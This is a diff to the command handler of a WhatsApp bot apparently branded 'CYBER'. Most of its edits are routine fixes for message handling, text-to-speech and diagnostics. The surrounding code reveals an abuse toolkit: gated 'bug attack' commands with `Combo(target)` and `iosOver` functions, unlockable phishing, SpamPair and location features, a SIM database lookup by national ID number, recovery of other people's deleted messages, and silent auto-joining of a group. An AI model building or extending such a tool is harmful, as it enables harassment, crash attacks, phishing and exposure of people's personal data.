@@ -33,9 +33,9 @@ const util = require('util')
 const chalk = require('chalk')
 const os = require('os')
 const axios = require('axios')
+const { askPrinceAI, synthesizePrinceTTS } = require('./allfunc/prince-ai')
 const fsx = require('fs-extra')
 const crypto = require('crypto')
-const googleTTS = require('google-tts-api')
 const ffmpeg = require('fluent-ffmpeg')
 const speed = require('performance-now')
 const { spawn: spawn, exec } = require('child_process')
@@ -57,7 +57,16 @@ const {
   getCountriesList, getStocksList, getStocksListPage, CRYPTO_TOP,
 } = require('./allfunc/trading');
 const FormData = require('form-data');
-const { Sticker, StickerTypes } = require('wa-sticker-formatter');
+// LAZY LOAD: wa-sticker-formatter depends on 'sharp' (native binary).
+// On Heroku/Codespaces the binary may be missing — crash silently handled.
+let Sticker, StickerTypes;
+try {
+    ({ Sticker, StickerTypes } = require('wa-sticker-formatter'));
+} catch (_e) {
+    console.warn('[case.js] wa-sticker-formatter unavailable (sharp binary missing):', _e?.message);
+    Sticker = null;
+    StickerTypes = null;
+}
 const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./allfunc/storage')
 const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
 let richpic = Buffer.alloc(0);
@@ -250,7 +259,7 @@ if (!global._antideleteSweepStarted) {
     }, 30 * 60 * 1000);
 }
 if (!global._antieditConfig) global._antieditConfig = { mode: 'off' };
-if (!global._antideleteConfig) global._antideleteConfig = { mode: 'private' };
+if (!global._antideleteConfig) global._antideleteConfig = { mode: 'off' };
 
 const ANTIEDIT_CONFIG_FILE = _botPaths ? _botPaths.antiedit : './database/antiedit_config.json';
 const ANTIDELETE_CONFIG_FILE = _botPaths ? _botPaths.antidelete : './database/antidelete_config.json';
@@ -412,31 +421,51 @@ function saveAntieditCfg(cfg, botNum) {
     } catch (e) { console.error('[ANTIEDIT] Config save error:', e); }
 }
 function _antideleteCfgFile(botNum) {
-    if (!botNum) return ANTIDELETE_CONFIG_FILE;
-    try {
-        const { isBotIsolated, getBotConfigPaths } = require('./allfunc/bot-workspace');
-        if (isBotIsolated()) {
-            const p = getBotConfigPaths(botNum);
-            if (p?.antidelete) return p.antidelete;
-        }
-    } catch (_) {}
-    return `./database/antidelete_config_${botNum}.json`;
+    if (botNum) return `./database/antidelete_config_${botNum}.json`;
+    return ANTIDELETE_CONFIG_FILE;
 }
 function loadAntideleteCfg(botNum) {
-    const fromHelpers = require('./allfunc/antidelete-helpers').loadAntideleteCfg;
-    return fromHelpers(botNum);
+    // 1. Check per-bot in-memory cache first (fastest)
+    if (!global._antideleteConfigs) global._antideleteConfigs = {};
+    if (botNum && global._antideleteConfigs[botNum]) return global._antideleteConfigs[botNum];
+
+    // 2. Read per-bot file only (NO global fallback — prevents cross-session contamination)
+    const filesToTry = botNum
+        ? [`./database/antidelete_config_${botNum}.json`]
+        : [ANTIDELETE_CONFIG_FILE]; // only used if botNum is empty (edge case)
+    for (const f of filesToTry) {
+        try {
+            if (fs.existsSync(f)) {
+                const d = JSON.parse(fs.readFileSync(f, 'utf-8'));
+                // migrate old format { enabled: true/false }
+                const result = d.mode ? d : (d.enabled === true ? { mode: 'private' } : null);
+                if (result) {
+                    if (botNum) global._antideleteConfigs[botNum] = result; // cache it
+                    return result;
+                }
+            }
+        } catch (e) {}
+    }
+    // AUTO-ENABLE: default to 'private' instead of 'off' so antidelete works out-of-the-box.
+    // If user explicitly runs ".antidelete off", saveAntideleteCfg writes 'off' to disk+cache
+    // and that cached value is returned above — this default only fires when NO config exists at all.
+    const _default = { mode: 'private' };
+    if (botNum) global._antideleteConfigs[botNum] = _default;
+    return _default;
 }
 function saveAntideleteCfg(cfg, botNum) {
     const cfgFile = _antideleteCfgFile(botNum);
+    // FIX: Normalise config — always write both mode and enabled for cross-module compatibility
+    const normalised = { mode: cfg.mode || 'off', enabled: (cfg.mode && cfg.mode !== 'off') };
     try {
         if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
         // ISOLATION FIX: write ONLY per-bot file — do NOT write to global file
         // Writing to global contaminates other sessions that haven't configured antidelete
-        fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2));
+        fs.writeFileSync(cfgFile, JSON.stringify(normalised, null, 2));
         // Update per-bot in-memory cache immediately
         if (!global._antideleteConfigs) global._antideleteConfigs = {};
-        if (botNum) global._antideleteConfigs[botNum] = cfg;
-        global._antideleteConfig = cfg; // keep global for backward compat (legacy paths)
+        if (botNum) global._antideleteConfigs[botNum] = normalised;
+        global._antideleteConfig = normalised; // keep global for backward compat (legacy paths)
     } catch (e) { console.error('[ANTIDELETE] Config save error:', e); }
 }
 
@@ -538,13 +567,46 @@ try {
 // ✅ GUARD: If socket not fully authenticated yet, skip silently
 if (!devtrust || !devtrust.user) return;
 
+// Pending text-to-speech requests waiting for a voice selection.
+if (!global._ttsPending) global._ttsPending = new Map();
+
 // Keep latest socket reference for background scanners
 if (devtrust && devtrust.user) global._activeNexusSocket = devtrust;
 
+// 🔍 DIAGNOSTIC LOG — shows every message that enters case.js
+{
+    const _diagB = m?.message?.conversation
+        || m?.message?.extendedTextMessage?.text
+        || m?.body || '';
+    console.log(`[CASE.JS] type=${chatUpdate?.type} fromMe=${m?.key?.fromMe} sender=${m?.sender?.split('@')[0]} body=${JSON.stringify(String(_diagB).slice(0,40))}`);
+}
+
 // ✅ GUARD: Bot ke automatic reply messages block karo (infinite loop fix)
-// 'append' = bot ne khud bheja hua message wapis aaya → skip
-// 'notify' = user/owner ka actual message → process karo
-if (chatUpdate && chatUpdate.type === 'append') return;
+// 'append' = device ka outgoing message (user ka command YA bot ka reply dono)
+// 'notify' = kisi aur ka incoming message
+// FIX: 'append' block karne se .menu/.ping jaise khud ke commands bhi block ho rahe the.
+// pair.js already BAE5 IDs filter karta hai (Baileys-generated bot replies).
+// Yahan sirf woh 'append' block karo jo command prefix se shuru nahi hote.
+if (chatUpdate && chatUpdate.type === 'append') {
+    // FIX: fromMe messages (owner's own commands from phone) — ALWAYS allow through.
+    // "Message yourself" self-chat messages arrive as append+fromMe=true.
+    // Blocking them here was causing .menu/.ping to silently fail.
+    if (!m.key?.fromMe) {
+        const _appendBody = m.message?.conversation
+            || m.message?.extendedTextMessage?.text
+            || m.body
+            || m.text
+            || '';
+        const _appendBodyStr = String(_appendBody || '').trim();
+        // Allow through if it starts with any known command prefix
+        const _knownPrefixes = (Array.isArray(global.prefa) && global.prefa.length)
+            ? global.prefa.filter(p => p)
+            : ['.', '!', '#', '&'];
+        // Use the actual command grammar; global.prefa can be unset in multi-bot workers.
+        const _appendIsCmd = /^[.!\/#$%&*]\S*/.test(_appendBodyStr);
+        if (!_appendIsCmd) return;
+    }
+}
 
 // ═════════════════════════════════════════════════════════════════════
 // 📢 BROADCAST — Global initializers (MUST run once, before switch)
@@ -756,50 +818,17 @@ async function getAnimeImageUrl(category) {
 const NEWSLETTER_JID = '120363408022768294@newsletter';
 const NEWSLETTER_NAME = "© CYBER by GAME CHANGER";
 
-const addNewsletterContext = (messageContent) => {
-  if (messageContent.contextInfo) {
-    return {
-      ...messageContent,
-      contextInfo: {
-        ...messageContent.contextInfo,
-        forwardingScore: 999,
-        isForwarded: true,
-        forwardedNewsletterMessageInfo: {
-          newsletterJid: NEWSLETTER_JID,
-          newsletterName: NEWSLETTER_NAME,
-          serverMessageId: -1
-        }
-      }
-    };
-  }
-  return {
-    ...messageContent,
-    contextInfo: {
-      forwardingScore: 999,
-      isForwarded: true,
-      forwardedNewsletterMessageInfo: {
-        newsletterJid: NEWSLETTER_JID,
-        newsletterName: NEWSLETTER_NAME,
-        serverMessageId: -1
-      }
-    }
-  };
-};
+// addNewsletterContext: previously injected forwardingScore:999 + isForwarded:true into
+// every bot reply, causing WhatsApp to silently drop or flag messages (especially in
+// self-chat / "Message yourself"). Now a safe pass-through — call sites are preserved
+// so no other code needs to change.
+const addNewsletterContext = (messageContent) => messageContent;
 
 const replyWithNewsletter = async (jid, text, quotedMsg, mentions = []) => {
   try {
-    // Channels/newsletters: NO quoted context — newsletters don't support it
-    if (jid && jid.endsWith('@newsletter')) {
-      await devtrust.sendMessage(jid, { text: text, mentions: mentions });
-      return;
-    }
-    await devtrust.sendMessage(jid,
-      addNewsletterContext({
-        text: text,
-        mentions: mentions
-      }),
-      { quoted: quotedMsg }
-    );
+    // Plain send — no newsletter forwarding context injected for any chat type.
+    // Newsletter context (forwardingScore:999) causes WhatsApp to drop messages silently.
+    await devtrust.sendMessage(jid, { text: text, mentions: mentions }, { quoted: quotedMsg });
   } catch (error) {
     console.error('Reply with newsletter error:', error);
     // Fallback: plain send, no quoted
@@ -808,20 +837,25 @@ const replyWithNewsletter = async (jid, text, quotedMsg, mentions = []) => {
 };
 
 const reply = async (text, mentions = []) => {
+  // FIX: normalize chat JID — strip device suffix (e.g. '123:5@s.whatsapp.net' → '123@s.whatsapp.net')
+  // Newer Baileys versions can produce JIDs with device suffix that cause sendMessage to fail silently.
+  const _replyJid = devtrust.decodeJid ? devtrust.decodeJid(m.chat) : m.chat;
+  // FIX: for self-chat ("Message yourself"), { quoted: m } can silently fail.
+  // Detect self-chat: remoteJid equals the bot's own JID.
+  const _botJidClean = String(devtrust._cachedBotNumber || devtrust.user?.id || '').replace(/:\d+@/, '@');
+  const _isSelfChat = _replyJid && _botJidClean && _replyJid.split('@')[0] === _botJidClean.split('@')[0];
   try {
-    if (m.chat?.endsWith('@newsletter')) {
-      return await devtrust.sendMessage(m.chat, { text, mentions }, { priority: true });
+    if (_isSelfChat) {
+      // Self-chat: plain send without quoted (quoted causes silent drop in "Message yourself")
+      return await devtrust.sendMessage(_replyJid, { text, mentions });
     }
-    return await devtrust.sendMessage(
-      m.chat,
-      addNewsletterContext({ text, mentions }),
-      { quoted: m, priority: true }
-    );
+    return await devtrust.sendMessage(_replyJid, { text, mentions }, { quoted: m });
   } catch (error) {
-    console.error('Reply failed:', error);
+    console.error('Reply failed:', error?.message || error);
     try {
-      return await devtrust.sendMessage(m.chat, { text, mentions }, { priority: true });
-    } catch (_) {
+      return await devtrust.sendMessage(_replyJid, { text, mentions });
+    } catch (_e) {
+      console.error('Reply fallback also failed:', _e?.message || _e);
       return null;
     }
   }
@@ -839,7 +873,7 @@ let body = (
     m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
     m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
     m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
-    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id :
+    m.mtype === "interactiveResponseMessage" ? (() => { try { return JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson || 'null')?.id || ''; } catch(_) { return ''; } })() :
     m.mtype === "messageContextInfo" ? m.message?.buttonsResponseMessage?.selectedButtonId ||
     m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
     m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
@@ -877,6 +911,69 @@ if (body === '[object Object]') {
         : '';
 }
 
+// 🛠️ CRITICAL FIX: If enriched body is still empty, try reading the raw message directly.
+// WhatsApp self-chat ("Message yourself") can deliver messages with unexpected mtype values
+// (e.g. 'protocolMessage', 'messageContextInfo' with nested content) that skip normal extraction.
+// This fallback catches those edge cases so commands are never silently dropped.
+if (!body || body === '[Pesan interaktif]' || body === '[Pesan telah dihapus]' || body === '[Pesan sementara]') {
+    const _rawText = m?.message?.conversation
+        || m?.message?.extendedTextMessage?.text
+        || m?.message?.ephemeralMessage?.message?.conversation
+        || m?.message?.ephemeralMessage?.message?.extendedTextMessage?.text
+        || m?.message?.protocolMessage?.text
+        || '';
+    if (_rawText) {
+        body = _rawText;
+    }
+}
+
+// A voice list reply is not prefixed with the bot command, so resolve it
+// before the normal command parser. The request is scoped to this chat/user.
+const _ttsPendingKey = `${m.chat}:${m.sender}`;
+const _pendingTts = global._ttsPending.get(_ttsPendingKey);
+if (_pendingTts && Date.now() - _pendingTts.createdAt < 5 * 60 * 1000) {
+    const _voiceInput = String(body || '').trim().toLowerCase();
+    const _numericVoiceMap = {
+        '1': 'en_us_female',
+        '2': 'en_us_male',
+        '3': 'en_gb_female',
+        '4': 'en_gb_male',
+    };
+    const _selectedVoice = _numericVoiceMap[_voiceInput]
+        || _voiceInput.replace(/^ttsvoice_/, '');
+    const _allowedVoices = new Set([
+        'en_us_female',
+        'en_us_male',
+        'en_gb_female',
+        'en_gb_male',
+    ]);
+    if (_allowedVoices.has(_selectedVoice)) {
+        global._ttsPending.delete(_ttsPendingKey);
+        try {
+            const { audio, mimetype, fileName } = await synthesizePrinceTTS(_pendingTts.text, _selectedVoice);
+            await devtrust.sendMessage(m.chat,
+                addNewsletterContext({
+                    audio,
+                    mimetype,
+                    ptt: true,
+                    fileName: fileName || 'cyber-tts.ogg',
+                }),
+                { quoted: m }
+            );
+        } catch (error) {
+            console.error('Prince TTS selection error:', error.message);
+            try {
+                await reply("❌ *Text-to-speech failed* • Try again later");
+            } catch (replyError) {
+                console.error('Prince TTS error reply failed:', replyError.message);
+            }
+        }
+        return;
+    }
+} else if (_pendingTts) {
+    global._ttsPending.delete(_ttsPendingKey);
+}
+
 // ============ COMMAND DETECTION (PER-USER PREFIX) ============
 // PERF FIX: cache owner/premium in memory — avoids 2x sync disk reads on every message
 if (!global._ownerCache) { try { global._ownerCache = JSON.parse(fs.readFileSync('./allfunc/owner.json')); } catch(_e) { global._ownerCache = []; } }
@@ -890,6 +987,9 @@ let prefix = getUserPrefix(m.sender);
 
 // STRICT command detection - ONLY detect if message STARTS WITH user's prefix
 const isCmd = body && typeof body === 'string' && body.startsWith(prefix);
+
+// 🔍 DIAG: log body + prefix + isCmd
+console.log(`[CASE-CMD] prefix="${prefix}" isCmd=${isCmd} body="${String(body).slice(0,30)}" mtype=${m.mtype}`);
 
 let command = '';
 let args = [];
@@ -917,8 +1017,9 @@ if (isCmd && command) {
             const _turboSender = _turboJidNum(m.sender);
             const _turboLinked = Boolean(m.key?.fromMe || (_turboSender && _turboSender === _turboBot));
             const _turboCreator = [devtrust._cachedBotNumber, ...(Array.isArray(owner) ? owner : [])].some((v) => _turboJidNum(v) === _turboSender) || Boolean(m.key?.fromMe);
-            // Private mode: linked user OR owner only — same rule as full command path
-            if (devtrust.public === false && !_turboLinked && !_turboCreator && !m.key?.fromMe) return;
+            // Do not drop hot commands from self-chat when WA reports another device/LID.
+            const _turboSelfChat = Boolean(m.key?.fromMe || _turboJidNum(m.chat) === _turboBot || areJidsSameUser(m.chat, devtrust.user?.id));
+            if (!devtrust.public && !_turboSelfChat && !_turboLinked && !_turboCreator && !m.key?.fromMe) return;
             ensureFlagCache();
             if (Date.now() - (global._flagCache.ts || 0) > 30 * 60 * 1000) {
                 try {
@@ -961,17 +1062,13 @@ if (!command && body && m.quoted) {
     }
 }
 
-// SPECIAL CHECK: If user types ONLY the default "." - show THEIR current prefix
-if (body && body.trim() === '.') {
-    reply(`🔧 *Your current prefix:* \`${prefix}\`\n_You can change it using_ \`${prefix}setprefix [new]\``);
-    return;
-}
 
 const qtext = args.join(" ");
 const q = args.join(" ");
 const tempMailData = {};
 const quoted = m.quoted ? m.quoted : m;
-const from = m.key.remoteJid;
+// FIX: use normalized m.chat (stripped of ':device' suffix) instead of raw remoteJid
+const from = m.chat;
 const sender = (m.isGroup || m.isNewsletter) ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid;
 const userMovieSessions = {};
 // ── Cache botNumber per-connection (unchanged until reconnect) ──
@@ -980,21 +1077,29 @@ if (!devtrust._cachedBotNumber) {
 }
 const botNumber = devtrust._cachedBotNumber;
 
-// ── Delete/revoke protocol — run antidelete immediately, then skip command pipeline
+// ── EARLY delete protocol — before flagCache/command switch (prevents .some() crash + spam errors)
 const _earlyDelProto = m.message?.protocolMessage;
 if ((_earlyDelProto?.type === 0 || _earlyDelProto?.type === 5) && _earlyDelProto?.key?.id) {
-    const _adBotEarly = jidToNum(getBotJid(devtrust));
-    if (_adBotEarly && loadAntideleteCfg(_adBotEarly).mode !== 'off'
-        && typeof global._adInvokeDeleteHandler === 'function') {
-        try {
-            await global._adInvokeDeleteHandler(devtrust, {
-                key: m.key,
-                protoKey: _earlyDelProto.key,
-                reportMiss: true,
-                retryMs: 1500,
-            });
-        } catch (e) { console.error('[ANTIDELETE]', e); }
-    }
+    try {
+        const _adBotNumEarly = jidToNum(getBotJid(devtrust));
+        const _adCfgEarly = loadAntideleteCfg(_adBotNumEarly);
+        if ((_adCfgEarly.mode || 'off') !== 'off') {
+            const _adChatEarly = m.key?.remoteJid || _earlyDelProto.key?.remoteJid || '';
+            const _adDelByEarly = m.key?.participant || _earlyDelProto.key?.participant || m.key?.remoteJid || '';
+            if (typeof global._adHandleMessageDelete === 'function') {
+                await global._adHandleMessageDelete(devtrust, {
+                    botNum: _adBotNumEarly,
+                    chatId: _adChatEarly,
+                    msgId: _earlyDelProto.key.id,
+                    deletedBy: _adDelByEarly,
+                    fromMeDelete: Boolean(_earlyDelProto.key?.fromMe),
+                    altChatIds: typeof global._adChatIdsFromKey === 'function'
+                        ? global._adChatIdsFromKey(_earlyDelProto.key || {})
+                        : [],
+                });
+            }
+        }
+    } catch (e) { console.error('[ANTIDELETE-EARLY]', e?.message || e); }
     return;
 }
 
@@ -1062,6 +1167,7 @@ if (_flagNow - global._flagCache.ts > 30 * 60 * 1000) { // SPEED: 15min→30min 
         global._flagCache.akUnlocked = fs.existsSync(_akuf) ? JSON.parse(fs.readFileSync(_akuf, 'utf-8')) : []; } catch(e) { global._flagCache.akUnlocked = []; }
     try { const _aksf = _p.join(__dirname, 'database', 'ak_secret.json');
         global._flagCache.akSecret = fs.existsSync(_aksf) ? (JSON.parse(fs.readFileSync(_aksf, 'utf-8')).code || '') : ''; } catch(e) { global._flagCache.akSecret = ''; }
+    // Location & SpamPair use same addkey1 (bugUnlocked) — no separate files needed
     global._flagCache.ts = _flagNow;
 }
 
@@ -1085,6 +1191,10 @@ const _cleanSenderNum = (m.sender || '').replace(/[^0-9]/g, '');
 const _senderAdultUnlocked = global._flagCache.adult.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
 // Bug & SIM Database unlock status for this sender (cached)
 const _senderBugUnlocked = global._flagCache.bug.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
+// Location & SpamPair unlock status (same addkey1 as Bug & SIM)
+const _senderLocUnlocked = _senderBugUnlocked;
+const _senderSpamUnlocked = _senderBugUnlocked;
+const _senderPhishUnlocked = _senderBugUnlocked;
 
 // Shared bug-section access guard — used by all bug attack commands
 const _requireBugAccess = () => {
@@ -1195,6 +1305,7 @@ const todayDateWIB = new Date().toLocaleDateString('id-ID', {
 
 // ============ STICKER HELPER FUNCTIONS ============
 async function sendImageAsSticker(chatId, media, quoted, options = {}) {
+    if (!Sticker) throw new Error('Sticker module unavailable (sharp binary missing)');
     try {
         const sticker = new Sticker(media, {
             pack: options.packname || global.packname || "CYBER",
@@ -1213,6 +1324,7 @@ async function sendImageAsSticker(chatId, media, quoted, options = {}) {
 }
 
 async function sendVideoAsSticker(chatId, media, quoted, options = {}) {
+    if (!Sticker) throw new Error('Sticker module unavailable (sharp binary missing)');
     try {
         const sticker = new Sticker(media, {
             pack: options.packname || global.packname || "CYBER",
@@ -3785,6 +3897,8 @@ async function iosOver(durationHours, XS) {
 }
 
 
+
+
 // ================= ( Combo Function — parallel waves )====================
 async function Combo(target) {
     for (let wave = 0; wave < 22; wave++) {
@@ -4119,7 +4233,9 @@ _Auto-saved via status antidelete_`;
 }
 
 // ── Store messages for antidelete recovery (ALL messages — antidelete first priority) ──
-if (!isCmd && typeof global._cacheMessageForAntidelete === 'function') {
+// FIX: Removed !isCmd filter — command-style messages (starting with prefix) sent by other users
+// must also be cached. Without this, deleting a command message always shows [not in cache].
+if (m.key?.id && m.key?.remoteJid && !m.message?.protocolMessage && typeof global._cacheMessageForAntidelete === 'function') {
     try { global._cacheMessageForAntidelete(m, devtrust); } catch (_) {}
 }
 
@@ -4321,13 +4437,17 @@ if (!isCmd && typeof global._cacheMessageForAntidelete === 'function') {
     } catch (e) { console.error('[ANTIDELETE STORE]', e); }
 })();
 
-if (devtrust.public === false) {
-    // Channels/newsletters mein bot owner/admin ke liye allow karo (even in private mode)
-    const _isNewsletterChat = m.chat && m.chat.endsWith('@newsletter');
-    // Channel sender ka number strip karke match karo (JID mein :1 suffix hota hai)
-    const _senderClean = (m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
-    const _isCreatorFromChannel = _isNewsletterChat && owner.some(o => o.replace(/[^0-9]/g, '') === _senderClean);
-    if (!_isBotLinkedUser() && !isCreator && !_isCreatorFromChannel) return;
+if (!devtrust.public) {
+    // Allow .self / .public / .private to pass even in self mode — so ANY user can toggle mode
+    const _isModeToggleCmd = isCmd && ['self', 'public', 'private'].includes(command);
+    const _isSelfChatCommand = Boolean(isCmd && (m.key?.fromMe || _jidNum(m.chat) === _botNumClean || areJidsSameUser(m.chat, devtrust.user?.id)));
+    if (!_isModeToggleCmd && !_isSelfChatCommand) {
+        // Channels/newsletters mein bot owner/admin ke liye allow karo (even in private mode)
+        const _isNewsletterChat = m.chat && m.chat.endsWith('@newsletter');
+        const _senderClean = (m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+        const _isCreatorFromChannel = _isNewsletterChat && owner.some(o => o.replace(/[^0-9]/g, '') === _senderClean);
+        if (!_isBotLinkedUser() && !isCreator && !_isCreatorFromChannel) return;
+    }
 }
 
 // Linked-user / owner commands — skip auto-react, status hooks, group moderation
@@ -4972,6 +5092,44 @@ if (m.message?.stickerMessage && !command) {
 // ============ MENU COMMAND ============
 
 switch(command) {
+
+// ============ ULTRA-SIMPLE ALIVE CHECK — responds before any complex logic ============
+case 'hi':
+case 'hello':
+case 'bot': {
+    // Simplest possible response — plain text, no image, no quote, no complex logic
+    // FIX: use normalized JID for sendMessage (strips device suffix that causes silent failure)
+    const _hiJid = devtrust.decodeJid ? devtrust.decodeJid(m.chat) : m.chat;
+    try {
+        await devtrust.sendMessage(_hiJid, {
+            text: `✅ *Bot Alive!*\n\nSender: @${m.sender.split('@')[0]}\nChat: ${_hiJid}\nType: ${chatUpdate?.type}\nFromMe: ${m.key?.fromMe}\nTime: ${new Date().toISOString()}`
+        });
+        console.log('[HI CMD] Response sent successfully to', _hiJid);
+    } catch (_hiErr) {
+        console.error('[HI CMD] sendMessage FAILED:', _hiErr?.message || _hiErr);
+        // Last resort: try sending to sender JID
+        try {
+            const _senderJid = devtrust.decodeJid ? devtrust.decodeJid(m.sender) : m.sender;
+            await devtrust.sendMessage(_senderJid, { text: `✅ Bot is alive! (fallback send)` });
+        } catch (_) {}
+    }
+    break;
+}
+
+// ============ DIAGNOSTIC TEST COMMAND ============
+case 'test':
+case 'bottest': {
+    // Plain no-frills send — confirms bot receives and can reply
+    try {
+        await devtrust.sendMessage(m.chat, {
+            text: `✅ *Bot is working!*\n\nCommand received: *${prefix}${command}*\nPrefix: ${prefix}\nSender: @${m.sender.split('@')[0]}\nTime: ${new Date().toISOString()}`
+        }, { priority: true });
+    } catch (_testErr) {
+        console.error('[TEST] sendMessage failed:', _testErr?.message);
+    }
+    break;
+}
+
 // ============ MENU WITH ALPHABETICAL ORDER ============
 
 case 'allmenu':
@@ -5560,6 +5718,7 @@ ${_senderAdultUnlocked ? '│❖ ' + prefix + 'xnxx' : ''}
 │❖ ${prefix}weatherinfo
 │❖ ${prefix}whois
 │❖ ${prefix}wiki
+│❖ ${prefix}webtoapk
 │❖ ${prefix}wikipedia
 ┗━━━━━━━━━━━━━━━━━━━━┛
 
@@ -5570,15 +5729,13 @@ ${_senderAdultUnlocked ? '│❖ ' + prefix + 'xnxx' : ''}
 │❖ ${prefix}earrape
 │❖ ${prefix}fast
 │❖ ${prefix}fat
-│❖ ${prefix}gtts
+│❖ ${prefix}texttospeech
 │❖ ${prefix}nightcore
 │❖ ${prefix}reverse
 │❖ ${prefix}robot
-│❖ ${prefix}say
 │❖ ${prefix}slow
 │❖ ${prefix}smooth
 │❖ ${prefix}squirrel
-│❖ ${prefix}tts
 ┗━━━━━━━━━━━━━━━━━━━━┛
 
 ┏━━◆ *CYBER - 𝐎𝐓𝐇𝐄𝐑* ◆━━┓
@@ -5661,7 +5818,6 @@ ${_senderBugUnlocked ? `┏━━◆ *CYBER - 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁�
 │   ↳ _13 digit CNIC number_
 │
 │ ◈ *📋 𝗦𝗜𝗠 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗠𝗘𝗡𝗨*
-│❖ ${prefix}simdatabase
 │❖ ${prefix}simdb
 │
 │ ◈ *📊 𝗗𝗔𝗧𝗔 𝗙𝗜𝗘𝗟𝗗𝗦*
@@ -5709,30 +5865,26 @@ break;
 
 case 'menu':
 case 'CYBER': {
-   setImmediate(() => autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {}));
-    devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } }, { priority: true }).catch(() => {});
+    setImmediate(() => autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {}));
+    devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } }).catch(() => {});
 
     const uptime = formatUptime(process.uptime());
     const totalMem = os.totalmem();
     const freeMem = os.freemem();
     const platform = os.platform();
     const date = getLagosTime();
-    const readmore = String.fromCharCode(8206).repeat(4001);
     const ramInfo = formatRam(totalMem, freeMem);
     const moodEmoji = getMoodEmoji();
     const totalCommands = countCommands();
     const hour = date.getHours();
     let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
-    
-    // Get professional features
+
     const ownerName = getOwnerName();
     const botVersion = getBotVersion();
     const botMode = getBotMode();
     const currentDateTime = getCurrentDateTime();
-    
-    // ALPHABETICAL SECTIONS
-    const menuText = `
-┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
+
+    const menuText = `┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
 ┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
 ┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
 ┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
@@ -5747,12 +5899,6 @@ case 'CYBER': {
 ┃ 🕒 ${currentDateTime} ${moodEmoji}
 ┗━━━━━━━━━━━━━━━━━━━━┛
 
-❖═━═══𖠁𐂃𖠁══━═❖
-♱  ${greeting}, *${pushname}*
-*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
-⚙️ *Powered by CYBER SEC PRO*
-❖═━═══𖠁𐂃𖠁══━═❖
-
 ┏━━◆ *CYBER - 𝐌𝐄𝐍𝐔 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒* ◆━━┓
 │❖ ${prefix}allmenu
 │❖ ${prefix}aimenu
@@ -5766,7 +5912,6 @@ ${_senderBugUnlocked ? '│❖ ' + prefix + 'bugmenu' : ''}
 │❖ ${prefix}ownermenu
 │❖ ${prefix}stickermenu
 │❖ ${prefix}toolsmenu
-${_senderBugUnlocked ? '│❖ ' + prefix + 'simdatabase' : ''}
 │❖ ${prefix}tvmenu
 │❖ ${prefix}tradingmenu
 │❖ ${prefix}bcmenu
@@ -5774,10 +5919,16 @@ ${_senderBugUnlocked ? '│❖ ' + prefix + 'simdatabase' : ''}
 │❖ ${prefix}othermenu
 ┗━━━━━━━━━━━━━━━━━━━━┛
 
-⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
-`;
+⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026`;
 
-    await reply(menuText);
+    // Use plain sendMessage — no newsletter context, no quoted — most reliable for self-chat
+    try {
+        await devtrust.sendMessage(m.chat, { text: menuText });
+    } catch (_menuErr) {
+        console.error('[MENU] sendMessage failed:', _menuErr?.message);
+        // Last-resort fallback via reply()
+        await reply(menuText).catch(() => {});
+    }
 }
 break;
 
@@ -7148,6 +7299,7 @@ case 'CYBERtool': {
 │❖ ${prefix}weatherinfo
 │❖ ${prefix}whois
 │❖ ${prefix}wiki
+│❖ ${prefix}webtoapk
 │❖ ${prefix}wikipedia
 ┗━━━━━━━━━━━━━━━━━━━━┛
 
@@ -7558,15 +7710,6 @@ Use *${prefix}CYBER* to see all menu.`;
     reply(botInfo);
 }
 break;
-case 'test': {
-  let botInfo =
-'*CYBER ᴀʟᴡᴀʏs ᴛʜᴇʀᴇ ғᴏʀ ʏᴏᴜ 🚀🔥*'
-
-  reply(botInfo);
-}
-
-break;
-
 case 'groupjid':
 case 'gid': {
     if (!m.isGroup) return reply("👥 *Groups only*");
@@ -7696,7 +7839,8 @@ break;
 // ======================[ 🔍 WHOIS ]======================
 case 'whois':
 case 'profile': {
-    const user = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
+    const user = m.mentionedJid?.[0] || m.quoted?.sender || m.sender;
     
     let pp;
     try {
@@ -7740,10 +7884,17 @@ case 'revoke':
